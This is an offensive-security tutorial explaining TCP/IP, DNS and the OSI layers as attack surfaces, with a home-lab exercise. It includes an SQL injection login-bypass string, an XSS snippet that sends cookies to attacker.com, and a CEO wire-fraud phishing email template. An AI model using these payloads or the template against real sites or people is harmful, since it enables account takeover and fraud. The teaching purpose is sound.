# 🌐 TCP/IP, DNS & The OSI Model — Advanced Networking for Hackers

> *"The OSI model isn't a checklist for an exam. It is a menu of options for destruction."*

---

## 📌 Table of Contents

- [Overview](#-overview)
- [Part 1 — TCP/IP: The Language of the Internet](#-part-1--tcpip-the-language-of-the-internet)
  - [What TCP/IP Actually Is](#what-tcpip-actually-is)
  - [The Three-Way Handshake](#-the-three-way-handshake)
  - [Hacking the Handshake — Three Weapons](#-hacking-the-handshake--three-weapons)
- [Part 2 — DNS: The Phone Book That Trusts Everyone](#-part-2--dns-the-phone-book-that-trusts-everyone)
  - [How DNS Works](#how-dns-works)
  - [DNS Spoofing — Redirecting Reality](#-dns-spoofing--redirecting-reality)
  - [DNS Tunneling — Smuggling Data in Plain Sight](#-dns-tunneling--smuggling-data-in-plain-sight)
- [Part 3 — The OSI Model: A Map of Attack Surfaces](#-part-3--the-osi-model-a-map-of-attack-surfaces)
  - [The 7-Layer Stack at a Glance](#-the-7-layer-stack-at-a-glance)
  - [Layer 1 — Physical Layer](#-layer-1--physical-layer)
  - [Layer 2 — Data Link Layer](#-layer-2--data-link-layer)
  - [Layer 3 — Network Layer](#-layer-3--network-layer)
  - [Layer 4 — Transport Layer](#-layer-4--transport-layer)
  - [Layer 5 — Session Layer](#-layer-5--session-layer)
  - [Layer 6 — Presentation Layer](#-layer-6--presentation-layer)
  - [Layer 7 — Application Layer](#-layer-7--application-layer)
- [The Hacker's OSI Checklist](#-the-hackers-osi-checklist)
- [Your Mission — Practical Lab Assignment](#-your-mission--practical-lab-assignment)
- [Key Terms Glossary](#-key-terms-glossary)

---

## 🎯 Overview

This is the **full advanced networking guide for hackers** — covering TCP/IP, DNS, and all seven layers of the OSI model from the bottom up.

This is not a textbook. You won't be memorizing definitions for an exam.

Every protocol, every layer, and every concept is explained through one lens:

> **Where is the flaw? How do we exploit it?**

By the end, you won't just understand how networks work — you'll understand exactly **where to hit them** to make them crumble.

---

## 🔌 Part 1 — TCP/IP: The Language of the Internet

### What TCP/IP Actually Is

**TCP/IP** stands for *Transmission Control Protocol / Internet Protocol*.

It is the **universal language of the internet**. Every device that communicates online — from your phone watching a video to a hacker breaching a server in Switzerland — speaks TCP/IP. There is no alternative. You either speak the language or you don't get to talk.

| Component | Full Name | Role |
|-----------|-----------|------|
| **IP** | Internet Protocol | Addressing — tells data *where* to go |
| **TCP** | Transmission Control Protocol | Delivery — guarantees data *actually gets there* |

The layer we care about most as hackers is **TCP** — because TCP is **reliable** and **polite**, and polite things can be abused.

---

### 🤝 The Three-Way Handshake

Before any data flows between two computers using TCP, they perform a ritual called the **three-way handshake**. Think of it as two strangers introducing themselves before a conversation.

```
   CLIENT                        SERVER
      |                             |
      |  ──── SYN ──────────────►  |   "Hello. I want to connect."
      |                             |
      |  ◄─── SYN-ACK ──────────  |   "Hi. I hear you. Ready to talk?"
      |                             |
      |  ──── ACK ──────────────►  |   "Great. Let's talk."
      |                             |
      |  ════ DATA FLOWS ════════  |   Connection established.
```

| Step | Packet | Meaning |
|------|--------|---------|
| 1 | **SYN** (Synchronize) | *"Hello — I want to connect"* |
| 2 | **SYN-ACK** (Synchronize-Acknowledge) | *"Hi, I hear you — ready to talk"* |
| 3 | **ACK** (Acknowledge) | *"Great — let's talk"* |

Once complete, a full TCP connection is established and data begins to flow.

> *"We hackers look at that polite, reliable handshake and we see a weapon. We can abuse every single step of that process."*

---

### ⚔️ Hacking the Handshake — Three Weapons

#### 🔍 Weapon 1: Stealth Port Scanning (Half-Open Scan)

This is exactly what **Nmap** does with the `-sS` stealth scan flag.

```
   ATTACKER                     TARGET SERVER
      |                             |
      |  ──── SYN ──────────────►  |   "Hello — are you home?"
      |                             |
      |  ◄─── SYN-ACK ──────────  |   "Yes! I'm here on port 22."
      |                             |       ← ATTACKER NOW HAS INTEL
      |  ──── RST ──────────────►  |   "Never mind." (hangs up)
      |                             |
                      Server usually does NOT log this.
```

**How it works:**
1. Send a SYN packet to a port
2. If the server responds with SYN-ACK → **port is open** ✅
3. Instead of completing the handshake, send a **RST (Reset)** packet — hanging up immediately
4. The connection is never fully established, so the server typically **doesn't log it**

**Result:** Full port intelligence. Zero footprint.

---

#### 💥 Weapon 2: SYN Flood — Denial of Service

```
   ATTACKER                     TARGET SERVER
      |                             |
      |  ── SYN ──────────────►   |
      |  ── SYN ──────────────►   |   Server replies to each one...
      |  ── SYN ──────────────►   |   ...allocates memory...
      |  ── SYN ──────────────►   |   ...waits for ACK...
      |  ── SYN ──────────────►   |   ...that never comes.
      |    × 1,000,000/second      |
      |                             |   ❌ OUT OF MEMORY → CRASH
```

The server is like a restaurant that takes a million orders and starts cooking all of them — but the customers all walk out. Eventually, the kitchen runs out of ingredients and shuts down.

> *"It's like ordering a thousand pizzas to a random house and never paying for them. The shop makes the pizzas, sends the drivers, and wastes all their money waiting for a customer who isn't there."*

**Result:** Server exhausts memory holding fake half-open connections and **crashes** — legitimate users are denied service.

---

#### 🎭 Weapon 3: IP Spoofing & Reflected Attacks

Every TCP packet contains a **return address** — just like a letter in the mail. But TCP/IP does not verify that the return address is actually yours.

```
   ATTACKER                PUBLIC SERVER            VICTIM
      |                         |                      |
      |  ── SYN (from: VICTIM) ►|                      |
      |                         |                      |
      |                         | ─── SYN-ACK ────────►|
      |                         |          (floods victim)
      |  (Attacker is hidden)   |                      |
```

**How it works:**
1. Attacker sends packets to a server but writes the **victim's IP** as the return address
2. The server receives the packet, gets confused or generates a large response
3. The server sends all replies **directly to the victim**
4. Scale this across **a million servers** → all of them simultaneously flood the victim

**Result:** Massive DDoS amplification attack — attacker stays **completely invisible**, victim gets destroyed.

---

## 📖 Part 2 — DNS: The Phone Book That Trusts Everyone

### How DNS Works

Computers don't understand domain names. To a computer, `google.com` is just a meaningless word. Computers only speak in **numbers** — specifically, IP addresses.

```
  YOU TYPE:    google.com
                   │
                   ▼
            DNS SERVER asks:
         "Who is google.com?"
                   │
                   ▼
         ANSWER: 142.250.183.46
                   │
                   ▼
  BROWSER CONNECTS to 142.250.183.46
```

**DNS** is the phone book that translates human-readable names into machine-readable IP addresses — automatically, silently, every time you visit a website.

> **The Problem:** DNS was invented in the 1980s when the internet was small and friendly. It was built on **pure trust**. Your computer just blindly accepts whatever answer it gets back — from anyone.

---

### 🎭 DNS Spoofing — Redirecting Reality

**Scenario:** You and your victim are both on the same coffee shop Wi-Fi.

```
  VICTIM types: mybank.com
        │
        ▼
  Victim's computer shouts:
  "WHO HAS THE IP FOR mybank.com?"
        │
        ├──────────────────────────────────────────────┐
        │                                              │
   [Real DNS Server]                           [Attacker on same WiFi]
   (Takes time to reply)                    (Screams back IMMEDIATELY)
                                            "I have it! It's 192.168.1.X"
                                                       │
                                                       ▼
                                          Victim's browser loads
                                          ATTACKER'S FAKE bank site
                                                       │
                                                       ▼
                                          Victim types password ← STOLEN
```

The URL bar still shows `mybank.com`. The victim **never knows they left the real site.**

---

### 🕳️ DNS Tunneling — Smuggling Data in Plain Sight

**Scenario:** You've compromised a machine inside a hyper-secure corporate network. The firewall blocks everything — no uploads, no email, no file transfers.

But here's the fatal flaw: **the firewall must allow DNS**. Without DNS, the internet breaks. And that gap is all we need.

```
INSIDE SECURE NETWORK              FIREWALL              ATTACKER'S SERVER
         │                             │                        │
         │  (Stolen file: credit        │                        │
         │   card numbers)             │                        │
         │                             │                        │
         │  Chop into tiny pieces      │                        │
         │                             │                        │
         ├── DNS lookup: ─────────────►│──────────────────────►│
         │  "cc_part1.hacker.com?"     │   (Looks like         │
         │                             │    normal DNS)        │
         ├── DNS lookup: ─────────────►│──────────────────────►│
         │  "cc_part2.hacker.com?"     │                       │
         │                             │                       │
         ├── DNS lookup: ─────────────►│──────────────────────►│
         │  "cc_part3.hacker.com?"     │                       │
         │                             │                       │
                                                Attacker stitches
                                                pieces back together
                                                → Full file received ✅
```

The firewall sees nothing but a series of normal-looking DNS lookups. It waves them all through.

> *"We are literally smuggling data right under the firewall's nose, disguised as boring internet traffic."*

---

## 🏗️ Part 3 — The OSI Model: A Map of Attack Surfaces

Most people learn the OSI model as seven layers of dry, abstract rules. They memorize it for an exam and forget it immediately.

**For hackers, the OSI model is something completely different.**

> *"The OSI model is not a set of rules. It is a map of attack surfaces. It tells us exactly where to hit a system to make it crumble."*

If you know which layer a technology lives in, you automatically know which tools will break it.

---

### 📊 The 7-Layer Stack at a Glance

```
┌─────────────────────────────────────────────────────────────┐
│  Layer 7  │  APPLICATION   │ HTTP, FTP, DNS, Email, Browsers │
├─────────────────────────────────────────────────────────────┤
│  Layer 6  │  PRESENTATION  │ SSL/TLS, Encryption, JPEG, MP3  │
├─────────────────────────────────────────────────────────────┤
│  Layer 5  │  SESSION       │ Session Cookies, Auth Tokens     │
├─────────────────────────────────────────────────────────────┤
│  Layer 4  │  TRANSPORT     │ TCP, UDP, Ports, Firewalls       │
├─────────────────────────────────────────────────────────────┤
│  Layer 3  │  NETWORK       │ IP Addresses, Routers, Routing   │
├─────────────────────────────────────────────────────────────┤
│  Layer 2  │  DATA LINK     │ MAC Addresses, Switches, ARP     │
├─────────────────────────────────────────────────────────────┤
│  Layer 1  │  PHYSICAL      │ Cables, Wi-Fi, Hardware, Signals │
└─────────────────────────────────────────────────────────────┘
            ▲ Start attacks here (physical access)
            │
            └─────────────── or here (user trust) ──────────────►
```

---

### ⚡ Layer 1 — Physical Layer

**What it is:** The real world. Cables, fiber optics, radio waves, network cards, Wi-Fi signals. The literal hardware that carries raw bits as voltage or light.

**Academics say:** Voltage levels, bit rates, signal encoding.

**Hackers think:** *Breaking and entering.*

> *"If I can walk into your server room and unplug the firewall, I have successfully hacked you at Layer 1."*

#### 🔴 Layer 1 Attacks

| Attack | Device | How It Works |
|--------|--------|-------------|
| **USB Rubber Ducky** | Disguised flash drive | Plugs in → computer registers it as a keyboard (hardware trust) → types 1,000 words/minute → opens terminal → downloads and executes malware → done before you can blink |
| **Wi-Fi Pineapple** | Rogue access point in a backpack | Broadcasts a stronger Wi-Fi signal than the real network → phones automatically connect to the strongest signal → all traffic now flows through the attacker |
| **Physical Server Access** | Your own hands | Unplug the firewall. Done. |

**Key insight:** Layer 1 attacks bypass every software-based defense. No firewall, no IDS, no encryption can stop someone who has **physical access to the hardware**.

> *"If you can touch the hardware or intercept the signal, the game is over."*

---

### 🔗 Layer 2 — Data Link Layer

**What it is:** The local neighborhood. Responsible for moving data between devices on the **same network** — two laptops on the same Wi-Fi, two servers in the same rack.

**The currency of Layer 2:** Not IP addresses. **MAC addresses** — unique hardware identifiers burned into every network card at the factory.

**The fatal flaw:** Switches and devices on a Layer 2 network trust MAC addresses **implicitly**. Anyone can claim to be anyone.

#### 🔴 Layer 2 Attack: ARP Poisoning / ARP Spoofing

**ARP** (Address Resolution Protocol) is how your computer maps IP addresses to MAC addresses. It does this by asking the network: *"Who has this IP? Tell me your MAC address."*

```
VICTIM'S COMPUTER asks:
"Who is the router? What's your MAC address?"
         │
         ├──────────────────────────────────────┐
         │                                      │
    [Real Router]                        [Attacker on same network]
    (Responds normally)             "That's me! Use MY MAC address."
                                               │
                                               ▼
                               Victim's computer now sends ALL traffic
                               (emails, passwords, photos) to attacker
                                               │
                                     Attacker reads it,
                                     maybe modifies it,
                                     then forwards it to the real router
                                               │
                                     Victim sees nothing wrong.
```

The attacker is now sitting **invisibly in the middle** of every conversation.

> *"I am the man in the middle. And it's all because Layer 2 doesn't verify who is speaking."*

---

### 🛣️ Layer 3 — Network Layer

**What it is:** The highway system of the internet. Where **IP addresses** live. Routers operate here — looking at destination addresses and calculating the best path for packets to travel globally.

**Hacker's view:** Layer 3 is about **redirection and confusion**.

#### 🔴 Layer 3 Attack 1: IP Spoofing + Reflected DoS

```
  ATTACKER                MILLIONS OF PUBLIC SERVERS          VICTIM
      │                           │                              │
      │── Request (FROM: VICTIM) ─►                             │
      │── Request (FROM: VICTIM) ─►                             │
      │── Request (FROM: VICTIM) ─►                             │
      │                           │                              │
      │                           │─── HUGE RESPONSE ──────────►│
      │                           │─── HUGE RESPONSE ──────────►│
      │                           │─── HUGE RESPONSE ──────────►│
      │                                                          │
  (Hidden, untouched)                                 ❌ OVERWHELMED
```

The return address on a Layer 3 packet is **never verified**. Write the victim's IP as the sender, and every server you contact will flood the victim with replies — while the attacker remains completely invisible.

#### 🔴 Layer 3 Attack 2: Route Injection (BGP Hijacking)

A hacker tricks routers into believing they offer the fastest path to a popular destination (like YouTube). Suddenly, a country's worth of traffic to YouTube is **routing through the attacker's server** — silently intercepted mid-transit.

---

### 🚪 Layer 4 — Transport Layer

**What it is:** How data is delivered. **TCP** (reliable, ordered, confirmed) or **UDP** (fast, fire-and-forget, unconfirmed). This is where **ports** live — the 65,535 virtual doors of every networked computer.

**Also here:** Firewalls. A firewall's primary job is to sit at Layer 4 and enforce rules like *"block port 80"* or *"allow port 443."*

#### 🔴 Layer 4 Attack: Packet Fragmentation — Smuggling Malware Past a Firewall

```
FULL MALICIOUS PAYLOAD
        │
        │ (Can't pass through firewall whole)
        │
   ─────┼──────────────────────────────────
        │
   Fragment 1: [Trigger piece]     → Firewall: "Just metal. OK." ✅
   Fragment 2: [Barrel piece]      → Firewall: "Just a tube. OK." ✅
   Fragment 3: [Handle piece]      → Firewall: "Harmless. OK."  ✅
        │
        └──► All fragments arrive at the TARGET machine
             Target's Layer 4 REASSEMBLES them
             ▼
        Complete malicious payload — now inside the network ✅
```

> *"Imagine sneaking a gun through a metal detector by disassembling it and sending the pieces through in separate boxes."*

The firewall inspects each fragment independently and sees nothing dangerous. The victim's machine reassembles the pieces — and executes the weapon.

---

### 🎫 Layer 5 — Session Layer

**What it is:** Controls the conversation. Keeps track of **who is talking to whom** across multiple requests. Without Layer 5, every click on a website would log you out because the server would forget you.

**In web terms:** This is your **session cookie** — the digital wristband that proves you already authenticated.

> *"Think of it like a wristband at a club. Once you show your ID at the door, you get a wristband. You don't need to show your ID every time you order a drink."*

#### 🔴 Layer 5 Attack: Session Hijacking

```
  VICTIM logs in → Server issues Session Cookie: "ABC123XYZ"
        │
        ▼
  Attacker steals cookie (via XSS, network sniffing, etc.)
        │
        ▼
  Attacker injects stolen cookie into their own browser
        │
        ▼
  Server receives request + cookie "ABC123XYZ"
  Server says: "Welcome back!" ← Thinks attacker IS the victim
        │
        ▼
  Attacker is now logged into victim's:
  ✅ Email  ✅ Bank  ✅ Social Media  — No password required
```

**Result:** Full account takeover — no brute force, no password cracking. Just a stolen wristband.

---

### 🔐 Layer 6 — Presentation Layer

**What it is:** Translation and encryption. Converts data into formats that applications can understand (JPEG, MP3, JSON). Also handles **SSL/TLS encryption** — the `S` in HTTPS. This is where the padlock in your browser lives.

#### 🔴 Layer 6 Attack: SSL Stripping

SSL Strip downgrades a victim's encrypted HTTPS connection to an unencrypted HTTP connection — making all traffic readable in plain text.

```
  VICTIM thinks they're connecting to: https://mybank.com
            │
            ▼
      [ATTACKER (Man in the Middle)]
            │
            │  ← Speaks HTTPS (encrypted) to the real bank
            │  → Speaks HTTP (plain text) to the victim
            │
            ▼
  All of victim's data arrives at attacker in PLAIN TEXT
  ┌────────────────────────────────────────┐
  │ username: john.doe                     │
  │ password: hunter2                      │   ← Attacker reads this
  │ account_transfer_to: 9988776655        │
  └────────────────────────────────────────┘
```

> *"SSL Strip tricks your browser into downgrading from a secure encrypted HTTPS connection to an insecure HTTP connection. The encryption is stripped away and I can read everything."*

---

### 💻 Layer 7 — Application Layer

**What it is:** What you actually see and interact with. The web browser, email client, video game, login form. The user interface.

**Why it matters most:** This is where **90% of modern hacking happens**.

> *"Because users interact here — and users are messy."*

At Layer 7, attacks target the **logic of the software itself** — and the **logic of the human using it**.

#### 🔴 Layer 7 Attack 1: SQL Injection

A login box expects a username. But at Layer 7, nothing stops you from typing **database commands** instead:

```sql
-- What the developer expected:
username = "john"
password = "secure123"

-- What a SQL injection attack sends:
username = ' OR '1'='1' --
password = anything

-- What the database actually executes:
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='anything'
-- '1'='1' is always TRUE → returns ALL users
-- Database dumps every username and password ✅
```

No password cracked. The **fundamental logic of the system** was manipulated.

#### 🔴 Layer 7 Attack 2: Cross-Site Scripting (XSS)

A hacker posts a comment on a public forum — but instead of text, the comment contains hidden JavaScript:

```html
<!-- Attacker's "comment": -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Every user who loads the page silently executes this →
     sends their session cookie to the attacker
     Account takeover — at scale, invisibly. -->
```

#### 🔴 Layer 7 Attack 3: Phishing — The Hardest Attack to Stop

> *"The most dangerous vulnerability at Layer 7 is the human being."*

```
Attacker sends email that looks exactly like victim's boss:
  From: ceo@company.com (spoofed)
  Subject: Urgent — Wire Transfer Required

  Hi [Name],
  Please wire $50,000 to account 9988776655 immediately.
  I'm in a meeting and can't talk. Do it now.
  — [Boss's Name]
```

**No firewall blocks this. No encryption stops it. No antivirus detects it.**

It is a direct attack on **human trust** — which has no patch.

---

## ✅ The Hacker's OSI Checklist

When you look at any target, don't just see a computer. See **seven layers of opportunity**:

| Question | Layer | Attack |
|----------|-------|--------|
| *Can I physically touch it?* | **Layer 1 — Physical** | USB drop, rogue AP, cable tap |
| *Can I spoof the local traffic?* | **Layer 2 — Data Link** | ARP poisoning, MAC spoofing |
| *Can I confuse the routing?* | **Layer 3 — Network** | IP spoofing, BGP hijacking, reflected DoS |
| *Can I bypass the firewall?* | **Layer 4 — Transport** | Packet fragmentation, port manipulation |
| *Can I steal the session key?* | **Layer 5 — Session** | Session hijacking, cookie theft |
| *Can I strip the encryption?* | **Layer 6 — Presentation** | SSL stripping, certificate spoofing |
| *Can I trick the app or user?* | **Layer 7 — Application** | SQLi, XSS, phishing, social engineering |

> *"Master the layers and you master the hack."*

---

## 🧪 Your Mission — Practical Lab Assignment

> *"Knowledge is passive. Action is power. Watching this video won't make you a hacker. Breaking things in a lab will."*

### Step 1: Pick One Layer
Choose any single layer from this guide that interests you most.

### Step 2: Fire Up Your Tools

| Layer | Tool to Use | What to Look For |
|-------|-------------|-----------------|
| Layer 1 | Physical inspection of your network | Unauthorized devices plugged in? |
| Layer 2 | **Wireshark** (filter: `arp`) | See ARP broadcasts in real time |
| Layer 3 | **Wireshark** (filter: `ip`) | Watch packets route through your gateway |
| Layer 4 | **Nmap** (`nmap -sS localhost`) | Scan your own ports with a half-open scan |
| Layer 5 | Browser DevTools → Application tab | Find and inspect your own session cookies |
| Layer 6 | **Wireshark** (filter: `ssl` or `tls`) | Watch TLS handshakes on your home network |
| Layer 7 | **DVWA** or **OWASP Juice Shop** | Practice SQLi and XSS in a legal environment |

### Step 3: See It on the Wire

Don't just read about it. **Open Wireshark or Nmap on your home lab** and watch the packets yourself. There is a massive difference between understanding a concept intellectually and watching it happen live on your screen.

> *"Don't just trust me — verify it yourself."*

---

## 📖 Key Terms Glossary

| Term | Definition |
|------|------------|
| **TCP/IP** | Transmission Control Protocol / Internet Protocol — the universal communication language of the internet |
| **Three-Way Handshake** | The SYN → SYN-ACK → ACK ritual TCP uses to establish a connection before data flows |
| **SYN Packet** | The initial "hello" packet that starts a TCP connection |
| **RST Packet** | A "reset" packet that immediately terminates a TCP connection — used in stealth port scans |
| **SYN Flood** | A DoS attack that sends millions of SYN packets without ever completing the handshake, exhausting server memory |
| **IP Spoofing** | Forging a false source IP address on a packet to hide the attacker's identity or misdirect responses |
| **DNS** | Domain Name System — translates human-readable domain names into IP addresses |
| **DNS Spoofing** | Intercepting a DNS query and responding with a malicious IP address before the real DNS server can reply |
| **DNS Tunneling** | Encoding and smuggling data inside DNS requests to exfiltrate information past firewalls |
| **OSI Model** | Open Systems Interconnection model — a 7-layer framework describing how data travels across a network |
| **MAC Address** | Media Access Control address — a unique hardware identifier assigned to every network interface at manufacture |
| **ARP Poisoning** | Sending fake ARP packets to associate the attacker's MAC address with a legitimate IP, enabling MITM attacks |
| **MITM (Man in the Middle)** | An attack where the hacker secretly intercepts and possibly alters communications between two parties |
| **Packet Fragmentation** | Breaking a malicious payload into smaller pieces to slip each piece past a firewall individually |
| **Session Hijacking** | Stealing a victim's session cookie to impersonate them to a web server — no password required |
| **SSL Stripping** | Downgrading an HTTPS connection to HTTP to expose encrypted traffic as readable plain text |
| **SQL Injection** | Injecting database commands into input fields to manipulate or dump backend databases |
| **XSS (Cross-Site Scripting)** | Injecting malicious JavaScript into a webpage that executes in other users' browsers |
| **Phishing** | Social engineering attack using deceptive emails or websites to steal credentials or trigger actions |
| **Nmap** | Network Mapper — a port scanning and service detection tool used in reconnaissance |
| **Wireshark** | A packet analyzer that captures and displays live network traffic in detail |
| **UDP** | User Datagram Protocol — a fast, connectionless alternative to TCP with no delivery guarantees |
| **BGP Hijacking** | Manipulating Border Gateway Protocol routing tables to redirect internet traffic through an attacker's server |
| **CVSS** | Common Vulnerability Scoring System — a standardized scale for rating the severity of vulnerabilities |

---

<div align="center">

---

*"Every rule about reliability is a rule we can exploit*
*to scan, flood, or spoof our way into a network."*

---

**Stay curious. Stay ethical.**
**One life. One shot. Make it count.**

</div>
